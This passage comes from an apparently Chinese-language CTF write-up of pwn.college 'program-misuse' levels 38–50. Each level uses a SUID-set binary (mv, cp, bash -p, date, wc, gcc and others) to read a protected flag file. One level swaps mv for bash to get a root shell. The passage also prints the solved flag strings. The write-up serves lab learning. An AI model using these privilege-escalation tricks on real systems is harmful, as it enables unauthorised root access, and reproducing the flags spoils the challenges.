<pre class="line-numbers language-none"><code class="language-none">chmod u+s file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Êï∞Â≠óÂΩ¢ÂºèËÆæÁΩÆÊùÉÈôê</strong>Ôºö</p>
<ul>
<li><code>4</code>ÔºöËØªÊùÉÈôê</li>
<li><code>2</code>ÔºöÂÜôÊùÉÈôê</li>
<li><code>1</code>ÔºöÊâßË°åÊùÉÈôê</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">chmod 644 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊòæÁ§∫ËØ¶ÁªÜ‰ø°ÊÅØ</strong>ÔºöÈÄöËøá <code>-v</code> ÈÄâÈ°πÊòæÁ§∫Êìç‰ΩúÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chmod -v 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ΩøÁî®ÁªùÂØπË∑ØÂæÑËÆæÁΩÆÊùÉÈôê</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">chmod &#x2F;path&#x2F;to&#x2F;file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level38<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/chmod<span class="token operator">!</span>
hacker@program-misuse~level38:/challenge$ <span class="token function">chmod</span> <span class="token number">777</span> /flag
hacker@program-misuse~level38:/challenge$ <span class="token function">cat</span> /flag 
pwn.college<span class="token punctuation">&#123;</span>QI1o6TWY0HyOp6UWUMrgD7oKFaf.0FM4EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level39cp"><a class="markdownIt-Anchor" href="#level39cp"></a> level39(cp)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflag
touch: cannot <span class="token function">touch</span> <span class="token string">'myflag'</span><span class="token builtin class-name">:</span> Permission denied
hacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflag.txt
touch: cannot <span class="token function">touch</span> <span class="token string">'myflag.txt'</span><span class="token builtin class-name">:</span> Permission denied
hacker@program-misuse~level39:/challenge$ <span class="token builtin class-name">cd</span> ~
hacker@program-misuse~level39:~$ <span class="token function">ls</span>
Desktop  leap  myflag
hacker@program-misuse~level39:~$ <span class="token function">cp</span> /flag ~/myflag
hacker@program-misuse~level39:~$ <span class="token function">cat</span> myflag 
pwn.college<span class="token punctuation">&#123;</span>Qk-mBYdB47xVyCjxSB0xC1SUaIZ.0VM4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÊàñËÄÖËØ¥ÂèØ‰ª•ËøôÊ†∑ÂÜô</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /flag /dev/stdout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level40mv"><a class="markdownIt-Anchor" href="#level40mv"></a> level40(mv)</h3>
<p>‰ΩøÁî® <code> </code>mv<code> </code> ÂëΩ‰ª§Êó†Ê≥ïÂú®‰∏çÊîπÂèòÊñá‰ª∂Â±ûÊÄßÁöÑÊÉÖÂÜµ‰∏ãÁßªÂä®Êñá‰ª∂</p>
<p>ÊÉ≥‰∫ÜÂçäÂ∞èÊó∂ÊÉ≥‰∏çÂá∫Â¶Ç‰ΩïÁªïËøá</p>
<ul>
<li>ÊÄùË∑Ø1</li>
</ul>
<p>Áúã‰∫Ügithub‰∏Ä‰ΩçËÄÅÂì•ÁöÑÂÜôÊ≥ïÔºõÂæàÁ•ûÂ•á</p>
<p>Â∞±ÊòØÂ∞ÜÂÖàÂ∞Ü <code>flag</code>Êñá‰ª∂ÁßªÂä®Âà∞ ÂΩìÂâçÁî®Êà∑ÁõÆÂΩï‰∏ã,ËôΩÁÑ∂Êñá‰ª∂Â±ûÊÄßÊ≤°ÊúâÂèëÁîüÊîπÂèòÔºå‰ΩÜÊòØÂπ≥Âè∞ÂèØ‰ª•‰øùÁïôËøô‰∏™ÁõÆÂΩïÊñá‰ª∂Âà∞ÂÖ∂‰ªñÂÖ≥Âç°ÔºåÈÇ£‰πàÊàë‰ª¨‰πãÈó¥Âà∞catÊúâsuid‰∏ãÁöÑÂÖ≥Âç°Â∞±ÂèØ‰ª•Áõ¥Êé•ËØª‰∫Ü</p>
<ul>
<li>
<p>ÊÄùË∑Ø2</p>
<p>ÈÄöËøáÁßªÂä®Â∞Ü mvÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ÊõøÊç¢‰∏∫bashÁöÑ‰∫åËøõÂà∂Êñá‰ª∂ÔºåÁÑ∂ÂêéËøêË°åÂà§È¢òÁ®ãÂ∫èÔºåÈÇ£‰πàbashÂ∞±ÊúâÁöÑsuidÊùÉÈôêÔºåÈÇ£‰πàÊàë‰ª¨Â∞±Êúâ‰∫ÜrootÊùÉÈôê</p>
<p>‰ªéËÄåÊèêÊùÉÊàêÂäü</p>
</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level40:/challenge$ ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> /usr/bin/bash /usr/bin/mv<span class="token operator">&amp;&amp;</span> ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> <span class="token parameter variable">-p</span>
Welcome to ./babysuid_level40<span class="token operator">!</span>

This challenge is part of a series of programs that
<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.

I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.
Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>

IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>
Welcome to ./babysuid_level40<span class="token operator">!</span>

This challenge is part of a series of programs that
<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.

I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.
Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>

IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>
mv-5.0<span class="token comment"># cat /flag</span>
pwn.college<span class="token punctuation">&#123;</span>wni-KDP3s-n97BB2eWOTe5wUl5i.0lM4EDLzczN0UzW<span class="token punctuation">&#125;</span>
mv-5.0<span class="token comment"># </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level41perl"><a class="markdownIt-Anchor" href="#level41perl"></a> level41(perl)</h3>
<p><code>Perl</code> is a high-level, versatile programming language know for its powerful text processing capabilities. It was created by <code>Lary Wall</code> in the late <code>1980s</code>.</p>
<p>Êàë‰ª¨ÈúÄË¶ÅÁî®perlËØ≠Ë®ÄÊù•ËØªÂèñ<code>/flag</code></p>
<p>Êã∑ÈóÆgpt</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span>

<span class="token keyword">use</span> strict<span class="token punctuation">;</span>
<span class="token keyword">use</span> warnings<span class="token punctuation">;</span>

<span class="token comment"># ÊâìÂºÄÊñá‰ª∂</span>
open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token keyword">die</span> <span class="token string">"Êó†Ê≥ïÊâìÂºÄÊñá‰ª∂ '/flag' $!"</span><span class="token punctuation">;</span>

<span class="token comment"># ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂπ∂ÊâìÂç∞Âà∞Ê†áÂáÜËæìÂá∫</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">print</span> <span class="token variable">$line</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># ÂÖ≥Èó≠Êñá‰ª∂</span>
close<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level41:~/demo$ <span class="token function">vim</span> perl.pl
hacker@program-misuse~level41:~/demo$ perl perl.pl 
pwn.college<span class="token punctuation">&#123;</span>E3xT7qLwd2jI9Ev6oHUdWFb4v-Z.01M4EDLzczN0UzW<span class="token punctuation">&#125;</span>
hacker@program-misuse~level41:~/demo$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level42python"><a class="markdownIt-Anchor" href="#level42python"></a> level42(python)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level42:/challenge$ <span class="token builtin class-name">cd</span> ~/demo/
hacker@program-misuse~level42:~/demo$ <span class="token function">vim</span> program_misuse_level42.py
hacker@program-misuse~level42:~/demo$ python program_misuse_level42.py 
pwn.college<span class="token punctuation">&#123;</span>InEQ92_mJH6ItEQoBai78E2l2Mj.0FN4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ÊâìÂºÄÊñá‰ª∂</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token comment"># ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ</span>
    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># ÊâìÂç∞Êñá‰ª∂ÂÜÖÂÆπ</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level43ruby"><a class="markdownIt-Anchor" href="#level43ruby"></a> level43(ruby)</h3>
<p>‰∏ç‰ºörubyÔºåÊã∑Êâìgpt</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># ÊâìÂºÄÊñá‰ª∂</span>
file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/flag'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'r'</span></span><span class="token punctuation">)</span>

<span class="token comment"># ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπ</span>
content <span class="token operator">=</span> file<span class="token punctuation">.</span>read

<span class="token comment"># ËæìÂá∫Êñá‰ª∂ÂÜÖÂÆπ</span>
puts content

<span class="token comment"># ÂÖ≥Èó≠Êñá‰ª∂</span>
file<span class="token punctuation">.</span>close
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ruby level43.ruby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level44bash"><a class="markdownIt-Anchor" href="#level44bash"></a> level44(bash)</h3>
<ul>
<li>ÂÜôbashËÑöÊú¨</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token punctuation">;</span> 
<span class="token keyword">do</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span><span class="token punctuation">;</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂèëÁé∞Ê≤°ÊúâÊùÉÈôêËØªÂèñ</p>
<p>ÂÆûÈôÖ‰∏äÂèëÁîüÁöÑÊÉÖÂÜµÊòØÔºåÁî±‰∫éÊàë‰ª¨Â∑≤ÁªèËÆæÁΩÆ‰∫Ü <code>SUID</code> ÔºåÊâÄ‰ª•Êàë‰ª¨Ê≠£Âú®ÂÉè <code>bash</code> ÈÇ£Ê†∑ÊâßË°å <code>pseudo-root</code> Ôºå‰ΩÜÂΩì <code>bash</code> ÂèëÁé∞Êàë‰ª¨Âπ∂‰∏çÊòØÁúüÊ≠£ÁöÑ <code>root</code> ÔºåËÄåÊòØÂú®ÊâÆÊºî <code>root</code> ÁöÑËßíËâ≤Êó∂ÔºåÂÆÉ‰ºöÂèñÊ∂àÊàë‰ª¨Âú® <code>SUIDing</code>  <code>bash</code> Êó∂Ëé∑ÂæóÁöÑÁâπÊùÉ„ÄÇËøôÁßçÂÅöÊ≥ïË¢´Áß∞‰∏∫ <code>mitigation</code> ÔºåÂÆÉÂèØ‰ª•ÂáèÂ∞ë <code>command injection</code> ÈÄ†ÊàêÁöÑ‰º§ÂÆ≥ÔºåÂõ†‰∏∫Â§ßÂ§öÊï∞ÊÉÖÂÜµ‰∏ãÔºå <code>command injection vulnerabilities end up hijacking /bin/sh</code> „ÄÇ</p>
<p>To disable <code>mitigation</code> , <code>bash -p [command]</code> is used.Ë¶ÅÁ¶ÅÁî® <code>mitigation</code> ÔºåÂèØ‰ª•‰ΩøÁî® <code>bash -p [command]</code> Áõ¥Êé•ËÆæÁΩÆ‰∏∫ÁâπÊùÉÊ®°Âºè</p>
<p>ÊâÄ‰ª•Áõ¥Êé•‰ΩøÁî® <code>bash -p /flag</code></p>
<h3 id="level45date"><a class="markdownIt-Anchor" href="#level45date"></a> level45(date)</h3>
<p>dateÔºåÂéüÊù•ÁöÑ‰ΩúÁî®ÊòØÊòæÁ§∫ÂΩìÂâçÊó∂Èó¥ÊàñËÄÖÂ∞ÜÊó∂Èó¥ÊåâÊ†ºÂºèËæìÂá∫Ôºå‰ΩÜÊòØÁî®<code>-f</code>ÂèØ‰ª•ËØªÂèñÊñá‰ª∂ÔºåÂ¶ÇÊûúÊñá‰ª∂ÂÜÖÂÆπ‰∏çÊòØÊ≠£Â∏∏ÁöÑÊó•ÊúüÔºåÂàô‰ºöÂõûÊòæÂá∫Êù•„ÄÇ</p>
<p><code>date -f /flag</code></p>
<h3 id="level46dmesg"><a class="markdownIt-Anchor" href="#level46dmesg"></a> level46(dmesg)</h3>
<p><code>dmesg</code>Ôºà&quot;display message&quot;ÁöÑÁº©ÂÜôÔºâÂëΩ‰ª§Áî®‰∫éÊòæÁ§∫LinuxÂÜÖÊ†∏ÁéØÁºìÂÜ≤Âå∫‰∏≠ÁöÑÊ∂àÊÅØ„ÄÇÂÆÉÊèê‰æõ‰∫Ü‰∏Ä‰∏™Êü•ÁúãÁ≥ªÁªüÂºïÂØºËøáÁ®ã‰∏≠ÂèëÁîüÁöÑ‰∫ã‰ª∂ÂíåÈîôËØØÁöÑÈÄîÂæÑÔºå‰ª•Âèä‰∏éËÆæÂ§á„ÄÅÈ©±Âä®Á®ãÂ∫èÂíåÂÖ∂‰ªñÂÜÖÊ†∏ÁªÑ‰ª∂Áõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØ„ÄÇ</p>
<p>Âü∫Êú¨Áî®Ê≥ïÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËøôÂ∞ÜÊòæÁ§∫ÂÜÖÊ†∏ÁéØÁºìÂÜ≤Âå∫‰∏≠ÁöÑÊâÄÊúâÊ∂àÊÅØ„ÄÇ‰∏∫‰∫Ü‰ΩøËæìÂá∫Êòì‰∫éÁÆ°ÁêÜÔºå‰Ω†ÂèØËÉΩÈúÄË¶ÅÂ∞ÜÂÖ∂‰∏éÁÆ°ÈÅìÁ¨¶Ôºà|Ôºâ‰∏ÄËµ∑‰ΩøÁî®Ôºå‰ª•‰æøËøõË°åÂàÜÈ°µÊàñÊêúÁ¥¢Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>‰Ω†‰πüÂèØ‰ª•‰ΩøÁî®<code>grep</code>ÂëΩ‰ª§Êù•ËøáÊª§ÁâπÂÆöÁöÑ‰ø°ÊÅØÔºåÊØîÂ¶ÇÂè™ÊòæÁ§∫ÂÖ≥‰∫éÁ°¨ÁõòÁöÑ‰ø°ÊÅØÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | grep sda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Â¶ÇÊûú‰Ω†Âè™ÊÉ≥Êü•ÁúãÊúÄËøëÁöÑNË°åÊ∂àÊÅØÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî®<code>tail</code>ÂëΩ‰ª§Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg | tail -n 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>‰Ω†‰πüÂèØ‰ª•Â∞Ü<code>dmesg</code>ËæìÂá∫‰øùÂ≠òÂà∞Êñá‰ª∂‰∏≠‰ª•‰æõÂêéÁª≠ÂèÇËÄÉÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg &gt; dmesg_output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>dmesg</code>ÂëΩ‰ª§ÁöÑËæìÂá∫ÈÄöÂ∏∏ÂåÖÊã¨‰∏éÁ≥ªÁªüÂºïÂØº„ÄÅËÆæÂ§áËØÜÂà´„ÄÅÈ©±Âä®Á®ãÂ∫èÂä†ËΩΩ„ÄÅÁ°¨‰ª∂ÈîôËØØÂíåÂÖ∂‰ªñÁ≥ªÁªüÁ∫ß‰∫ã‰ª∂Áõ∏ÂÖ≥ÁöÑÊ∂àÊÅØ„ÄÇ</p>
<p>Ê≠§È¢òÁõ¥Êé•‰ΩøÁî®<code>dmesg -F /flag</code></p>
<h3 id="level47wc"><a class="markdownIt-Anchor" href="#level47wc"></a> level47(wc)</h3>
<p><code>wc</code> ÊòØ‰∏Ä‰∏™Â∏∏Áî®ÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÁî®‰∫éÁªüËÆ°Êñá‰ª∂‰∏≠ÁöÑÂ≠óÊï∞„ÄÅË°åÊï∞ÂíåÂ≠óÁ¨¶Êï∞„ÄÇÂÆÉÁöÑÂêçÂ≠ó‰ª£Ë°® ‚Äúword count‚ÄùÔºå‰ΩÜÂÆûÈôÖ‰∏äÂÆÉËÉΩÂ§üÊèê‰æõÊõ¥Â§ö‰ø°ÊÅØ„ÄÇÈÄöËøáÂú®ÂëΩ‰ª§Ë°å‰∏≠ËæìÂÖ• <code>wc</code> Âä†‰∏äÊñá‰ª∂ÂêçÔºåÂÆÉ‰ºöËøîÂõûÊñá‰ª∂‰∏≠ÁöÑË°åÊï∞„ÄÅÂ≠óÊï∞ÂíåÂ≠óÁ¨¶Êï∞„ÄÇ</p>
<p><code>wc</code> ÂëΩ‰ª§ÁöÑÂ∏∏ËßÅÁî®Ê≥ïÂåÖÊã¨Ôºö</p>
<ol>
<li>
<p>ÁªüËÆ°Êñá‰ª∂ÁöÑË°åÊï∞Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -l filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÁªüËÆ°Êñá‰ª∂ÁöÑÂçïËØçÊï∞Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -w filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÁªüËÆ°Êñá‰ª∂ÁöÑÂ≠óÁ¨¶Êï∞Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -c filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÁªüËÆ°Êñá‰ª∂ÁöÑÂ≠óËäÇÊï∞ÔºàËÄÉËôëÂ§öÂ≠óËäÇÂ≠óÁ¨¶ÔºâÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -m filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÁªüËÆ°Êñá‰ª∂‰∏≠ÊúÄÈïøË°åÁöÑÈïøÂ∫¶Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -L filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÁªüËÆ°Â§ö‰∏™Êñá‰ª∂ÁöÑÊÄªË°åÊï∞„ÄÅÂçïËØçÊï∞ÂíåÂ≠óÁ¨¶Êï∞Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc -lwc filename1 filename2 filename3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>ÈÄöËøáÁÆ°ÈÅìÁ¨¶Â∞ÜÂÖ∂‰ªñÂëΩ‰ª§ÁöÑËæìÂá∫‰º†ÈÄíÁªô <code>wc</code> ËøõË°åÁªüËÆ°Ôºå‰æãÂ¶ÇÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">cat filename | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>wcÔºåwcÂëΩ‰ª§Âéü‰ΩúÁî®ÊòØÁªüËÆ°Êñá‰ª∂ÁöÑÂ≠óËäÇÊï∞„ÄÅÂ≠óÊï∞„ÄÅË°åÊï∞„ÄÇ‰ΩÜÊòØÈÄöËøá<code>--files0-from</code>ÂèÇÊï∞ÂèØ‰ª•‰ªéÊñá‰ª∂‰∏≠ËØªÂèñÊñá‰ª∂ÂêçÔºåÊâÄ‰ª•Â¶ÇÊûúÊñá‰ª∂ÂÜÖÂÆπ‰∏çÊòØ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÊñá‰ª∂ÂêçÁöÑËØùÂ∞±‰ºöÂõûÊòæÂá∫Êù•ÔºåÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">wc --files0-from&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h3 id="level48gcc"><a class="markdownIt-Anchor" href="#level48gcc"></a> level48(gcc)</h3>
<ul>
<li>ÊÄùË∑Ø1ÊòØÁõ¥Êé•ÁºñÂÜô‰∏Ä‰∏™CÊñá‰ª∂ÔºåÁÑ∂ÂêéËØªÂèñ/flag</li>
</ul>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   FILE <span class="token operator">*</span> fptr<span class="token punctuation">;</span>
   fptr <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>fptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error opening file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
 <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

 <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fptr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>

 <span class="token function">fclose</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>ÊàñËÄÖÂèØ‰ª•Áõ¥Êé•È¢ÑÂ§ÑÁêÜ/flagÊñá‰ª∂,Â§¥Êñá‰ª∂ÂåÖÂê´Âç≥ÂèØÔºåÊä•Èîô‰ø°ÊÅØ‰ºöÂõûÊòæ/flag</li>
</ul>
<p>‚Äã	<code>gcc -x c -E /flag</code></p>
<h3 id="level49as"><a class="markdownIt-Anchor" href="#level49as"></a> level49(as)</h3>
<p>asÊòØGNUÁªÑÁªáÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÊ±áÁºñËØ≠Ë®ÄÁºñËØëÂô®ÔºåÂÆÉÊîØÊåÅÂ§öÁßç‰∏çÂêåÁ±ªÂûãÁöÑÂ§ÑÁêÜÂô®„ÄÇÊä•Èîô‰ºöÂõûÊòæÈóÆÊñá‰ª∂‰ø°ÊÅØ„ÄÇ</p>
<p>ÊÉ≥Ë¶ÅÂéªÈô§‰∏Ä‰∫õÊùÇ‰π±‰ø°ÊÅØÂ∞±ËøôÊ†∑Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">as @&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level50wget"><a class="markdownIt-Anchor" href="#level50wget"></a> level50(wget)</h3>
<p>wgetÔºåwgetÊòØLinuxÁ≥ªÁªü‰∏ãËΩΩÊñá‰ª∂Â∑•ÂÖ∑„ÄÇ</p>
<p>‰∏ÄËà¨ÂèØ‰ª•ÈÄöËøá<code>-i</code>ÂèÇÊï∞Êù•Ëé∑ÂèñÊñá‰ª∂‰∏≠ÂÜÖÂÆπÔºå‰∏çËøáÂèëÁé∞ÂÆÉÊääÂ§ßÂÜôÂ≠óÊØçÂÖ®ÈÉ®ËΩ¨ÊàêÂ∞èÂÜôÂ≠óÊØç‰∫ÜÔºåËøô‰∏çÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑ„ÄÇ</p>
<p>Êü•ÁúãÊúâÂÖ≥Êñá‰ª∂ÁöÑÂëΩ‰ª§</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> FILE
  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE
  -a,  --append-output<span class="token operator">=</span>FILE        append messages to FILE
  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE
       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use
       --rejected-log<span class="token operator">=</span>FILE         log reasons <span class="token keyword">for</span> URL rejection to FILE
  -O,  --output-document<span class="token operator">=</span>FILE      <span class="token function">write</span> documents to FILE
       --load-cookies<span class="token operator">=</span>FILE         load cookies from FILE before session
       --save-cookies<span class="token operator">=</span>FILE         save cookies to FILE after session
       --post-file<span class="token operator">=</span>FILE            use the POST method<span class="token punctuation">;</span> send contents of FILE
       --body-file<span class="token operator">=</span>FILE            send contents of FILE. <span class="token parameter variable">--method</span> MUST be <span class="token builtin class-name">set</span>
       <span class="token parameter variable">--certificate</span><span class="token operator">=</span>FILE          client certificate <span class="token function">file</span>
       --private-key<span class="token operator">=</span>FILE          private key <span class="token function">file</span>
